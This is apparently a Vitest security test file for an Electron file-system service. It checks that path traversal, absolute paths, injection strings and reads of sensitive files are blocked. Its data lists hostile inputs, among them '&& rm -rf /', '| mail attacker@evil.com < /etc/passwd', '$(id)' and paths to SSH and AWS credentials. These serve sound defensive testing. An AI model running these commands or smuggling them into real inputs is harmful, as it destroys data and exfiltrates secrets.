/**
 * Security-focused tests for ElectronFileSystemService
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { ElectronFileSystemService } from '../ElectronFileSystemService';
import { tmpdir } from 'os';
import { join } from 'path';
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'fs';

const { execFileMock } = vi.hoisted(() => ({
  execFileMock: vi.fn(),
}));

// Mock child_process to test command injection prevention
vi.mock('node:child_process', () => ({
  execFile: execFileMock,
  default: {
    execFile: execFileMock,
  },
}));

// Mock promisify to work with our mocked execFile.
// In vitest 4 the imported `execFile` is no longer referentially `===` our
// local mock, so identify it by name/mock-flag instead of identity.
vi.mock('node:util', async (importOriginal) => {
  const actual = await importOriginal<typeof import('util')>();
  return {
    ...actual,
    promisify: (fn: any) => {
      if (fn === execFileMock || fn?._isMockFunction || fn?.name === 'execFile') {
        return vi.fn(async (_cmd: string, _args: string[]) => {
          // Simulate ripgrep output
          return { stdout: '' };
        });
      }
      return (actual as any).promisify(fn);
    }
  };
});

describe('ElectronFileSystemService Security Tests', () => {
  let service: ElectronFileSystemService;
  let testWorkspace: string;

  beforeEach(() => {
    vi.clearAllMocks();

    // Create a temporary test workspace
    testWorkspace = mkdtempSync(join(tmpdir(), 'test-workspace-'));

    // Create some test files and directories
    writeFileSync(join(testWorkspace, 'safe.txt'), 'safe content');
    mkdirSync(join(testWorkspace, 'src'), { recursive: true });
    writeFileSync(join(testWorkspace, 'src', 'app.js'), 'console.log("app");');

    service = new ElectronFileSystemService(testWorkspace);
  });

  afterEach(() => {
    // Clean up test workspace
    try {
      rmSync(testWorkspace, { recursive: true, force: true });
    } catch (error) {
      // Ignore cleanup errors in tests
    }
  });

  describe('Path Traversal Prevention', () => {
    it('should block reading files outside workspace', async () => {
      const attempts = [
        '../../../etc/passwd',
        '../../.ssh/id_rsa',
        '../test.txt',
        'valid/../../../dangerous.txt',
      ];

      for (const path of attempts) {
        const result = await service.readFile(path);
        expect(result.success).toBe(false);
        expect(result.error).toContain('dangerous patterns');
      }
    });

    it('should block listing directories outside workspace', async () => {
      const attempts = [
        { path: '../' },
        { path: '../../' },
        { path: '../../../home' },
      ];

      for (const options of attempts) {
        const result = await service.listFiles(options);
        expect(result.success).toBe(false);
        expect(result.error).toBeDefined();
      }
    });

    it('should block searching outside workspace', async () => {
      const attempts = [
        { path: '../' },
        { path: '../../.ssh' },
        { path: '/etc' },
      ];

      for (const options of attempts) {
        const result = await service.searchFiles('password', options);
        expect(result.success).toBe(false);
        expect(result.error).toBeDefined();
      }
    });
  });

  describe('Absolute Path Prevention', () => {
    it('should reject absolute paths in all operations', async () => {
      const absolutePaths = [
        '/etc/passwd',
        '/home/user/.bashrc',
        'C:\\Windows\\System32\\config.sys',
      ];

      for (const path of absolutePaths) {
        // Test readFile
        const readResult = await service.readFile(path);
        expect(readResult.success).toBe(false);

        // Test listFiles
        const listResult = await service.listFiles({ path });
        expect(listResult.success).toBe(false);

        // Test searchFiles
        const searchResult = await service.searchFiles('test', { path });
        expect(searchResult.success).toBe(false);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should safely handle malicious search queries', async () => {
      const maliciousQueries = [
        '; cat /etc/passwd',
        '&& rm -rf /',
        '| mail attacker@evil.com < /etc/passwd',
        '$(cat /etc/passwd)',
        '`cat /etc/passwd`',
      ];

      for (const query of maliciousQueries) {
        // Should not throw and should handle safely
        const result = await service.searchFiles(query);
        // Check that execFile was called (not exec with shell)
        // and that the query was passed as an argument, not interpolated
      }
    });

    it('should reject dangerous file patterns', async () => {
      const dangerousPatterns = [
        '; ls',
        '&& cat /etc/passwd',
        '| grep password',
        '`whoami`',
        '$(id)',
      ];

      for (const pattern of dangerousPatterns) {
        const result = await service.searchFiles('test', {
          filePattern: pattern
        });
        expect(result.success).toBe(false);
        expect(result.error).toContain('Invalid file pattern');
      }
    });
  });

  describe('Sensitive File Protection', () => {
    it('should block access to sensitive file extensions', async () => {
      // Create some files with sensitive extensions in the workspace
      const sensitiveFiles = [
        'secret.pem',
        '.env',
        'data.sqlite',
        'wallet.wallet',
        'key.key',
      ];

      for (const file of sensitiveFiles) {
        writeFileSync(join(testWorkspace, file), 'sensitive data');

        const result = await service.readFile(file);
        expect(result.success).toBe(false);
        expect(result.error).toContain('File type');
      }
    });

    it('should block access to hidden sensitive directories', async () => {
      const sensitivePaths = [
        '.ssh/id_rsa',
        '.aws/credentials',
        '.gnupg/private.key',
      ];

      for (const path of sensitivePaths) {
        const result = await service.readFile(path);
        expect(result.success).toBe(false);
      }
    });
  });

  describe('Access Logging', () => {
    it('should log successful file access', async () => {
      await service.readFile('safe.txt');
      const logs = service.getAccessLog();

      expect(logs.length).toBeGreaterThan(0);
      const lastLog = logs[logs.length - 1];
      expect(lastLog.operation).toBe('read');
      expect(lastLog.success).toBe(true);
      expect(lastLog.path).toContain('safe.txt');
    });

    it('should log failed access attempts', async () => {
      await service.readFile('../../../etc/passwd');
      const logs = service.getAccessLog();

      const failedLogs = logs.filter(log => !log.success);
      expect(failedLogs.length).toBeGreaterThan(0);
      expect(failedLogs[0].operation).toBe('read');
    });

    it('should limit log size to prevent memory issues', async () => {
      // Make many access attempts
      for (let i = 0; i < 1500; i++) {
        await service.readFile('safe.txt');
      }

      const logs = service.getAccessLog(2000);
      expect(logs.length).toBeLessThanOrEqual(1000); // MAX_LOG_ENTRIES
    });

    it('should not expose full paths in logs', async () => {
      await service.readFile('src/app.js');
      const logs = service.getAccessLog();

      const lastLog = logs[logs.length - 1];
      // Should not contain the full workspace path
      expect(lastLog.path).not.toContain(testWorkspace);
    });
  });

  describe('Safe Operations', () => {
    it('should allow reading safe files within workspace', async () => {
      const result = await service.readFile('safe.txt');
      expect(result.success).toBe(true);
      expect(result.content).toBe('safe content');
    });

    it('should allow listing safe directories', async () => {
      const result = await service.listFiles();
      expect(result.success).toBe(true);
      expect(result.files).toBeDefined();
      expect(result.files?.some(f => f.name === 'safe.txt')).toBe(true);
    });

    it('should handle nested paths safely', async () => {
      const result = await service.readFile('src/app.js');
      expect(result.success).toBe(true);
      expect(result.content).toContain('console.log');
    });
  });

  describe('Edge Cases', () => {
    it('should handle null and undefined paths safely', async () => {
      const nullResult = await service.readFile(null as any);
      expect(nullResult.success).toBe(false);

      const undefinedResult = await service.readFile(undefined as any);
      expect(undefinedResult.success).toBe(false);
    });

    it('should handle empty string paths', async () => {
      const result = await service.readFile('');
      expect(result.success).toBe(false);
    });

    it('should handle very long paths', async () => {
      const longPath = 'a/'.repeat(1000) + 'file.txt';
      const result = await service.readFile(longPath);
      expect(result.success).toBe(false);
    });

    it('should handle special characters in filenames', async () => {
      const specialChars = [
        'file;rm.txt',
        'file|cat.txt',
        'file&ls.txt',
        'file$(whoami).txt',
      ];

      for (const filename of specialChars) {
        const result = await service.readFile(filename);
        expect(result.success).toBe(false);
      }
    });
  });

  describe('Resource Cleanup', () => {
    it('should clear access logs on destroy', async () => {
      await service.readFile('safe.txt');
      expect(service.getAccessLog().length).toBeGreaterThan(0);

      service.destroy();
      expect(service.getAccessLog().length).toBe(0);
    });
  });
});
